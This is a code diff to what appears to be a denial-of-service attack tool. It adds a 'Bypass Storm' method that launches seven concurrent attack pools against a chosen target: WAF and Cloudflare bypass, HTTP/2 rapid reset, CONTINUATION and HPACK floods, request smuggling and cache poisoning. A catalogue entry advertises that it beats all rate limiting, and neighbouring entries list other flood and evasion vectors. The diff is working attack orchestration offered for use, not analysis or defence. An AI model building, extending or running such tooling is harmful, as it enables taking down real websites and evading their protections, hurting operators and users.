@@ -348,6 +348,8 @@ const HTTP_PROXY_METHODS = new Set([
   // Geass vectors — must rotate via proxy to bypass Cloudflare IP filtering
   "geass-override", "cf-bypass", "nginx-killer", "h2-rst-burst", "grpc-flood",
   "h2-storm", "pipeline-flood", "conn-flood", "slowloris",
+  // Composite bypass
+  "bypass-storm",
 ]);
 
 function spawnPool(
@@ -738,6 +740,39 @@ async function runAttackWorkers(
     return;
   }
 
+  // ─────────────────────────────────────────────────────────────────────────
+  //  BYPASS STORM — focused 7-vector WAF/Cloudflare composite
+  //  Less RAM than geass-override, tuned specifically for CF/Akamai bypasses
+  // ─────────────────────────────────────────────────────────────────────────
+  if (method === "bypass-storm") {
+    const wafW  = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);
+    const h2W   = Math.max(4, CPU_COUNT);
+    const contW = Math.max(3, Math.floor(CPU_COUNT * 0.75));
+    const hpackW= Math.max(3, Math.floor(CPU_COUNT / 2));
+    const smugW = 2;
+    const bypassW = Math.max(3, Math.floor(CPU_COUNT / 2));
+    const cacheW = 2;
+
+    const wafT    = Math.max(600, Math.round(threads * 0.45));
+    const h2T     = Math.max(800, Math.round(threads * 0.65));
+    const contT   = Math.max(500, Math.round(threads * 0.40));
+    const hpackT  = Math.max(400, Math.round(threads * 0.35));
+    const smugT   = Math.max(80,  Math.round(threads * 0.05));
+    const bypassT = Math.max(300, Math.round(threads * 0.25));
+    const cacheT  = Math.max(80,  Math.round(threads * 0.05));
+
+    await Promise.all([
+      spawnPool("waf-bypass",         target, port, wafT,    wafW,    signal, onStats),
+      spawnPool("h2-rst-burst",       target, port, h2T,     h2W,    signal, onStats),
+      spawnPool("http2-continuation", target, port, contT,   contW,  signal, onStats),
+      spawnPool("hpack-bomb",         target, port, hpackT,  hpackW, signal, onStats),
+      spawnPool("http-smuggling",     target, port, smugT,   smugW,  signal, onStats),
+      spawnPool("http-bypass",        target, port, bypassT, bypassW,signal, onStats),
+      spawnPool("cache-poison",       target, port, cacheT,  cacheW, signal, onStats),
+    ]);
+    return;
+  }
+
   // All other real-network methods: single pool of CPU_COUNT workers (1 in dev)
   await spawnPool(method, target, port, threads, CPU_COUNT, signal, onStats);
 }
@@ -746,6 +781,7 @@ async function runAttackWorkers(
 const METHODS_CATALOGUE = [
   // Geass / Special
   { id: "geass-override",       name: "Geass Override ∞ [ARES 35v]",          layer: "ALL",  protocol: "TCP/UDP/H2/TLS",       tier: "ARES",   description: "MAX POWER — 35 simultaneous attack vectors: H2+TCP+UDP+TLS+Slowloris+WAF+WebSocket+GraphQL+RUDY+Cache+Pipeline+Smuggling+QUIC+ICMP+DNS+NTP+Memcached+SSDP+DoH+gRPC" },
+  { id: "bypass-storm",         name: "Bypass Storm [WAF/CF 7v]",             layer: "L7",   protocol: "HTTP/2+TLS",           tier: "S",      description: "7-vector WAF/CF bypass: WAF-Bypass + H2-RST + H2-CONTINUATION + HPACK-Bomb + HTTP-Smuggling + HTTP-Bypass + Cache-Poison — beats all rate limiting" },
   // L7 Application
   { id: "waf-bypass",           name: "Geass WAF Bypass",                     layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF with 7 concurrent vectors" },
   { id: "http2-flood",          name: "HTTP/2 Rapid Reset",                   layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s" },
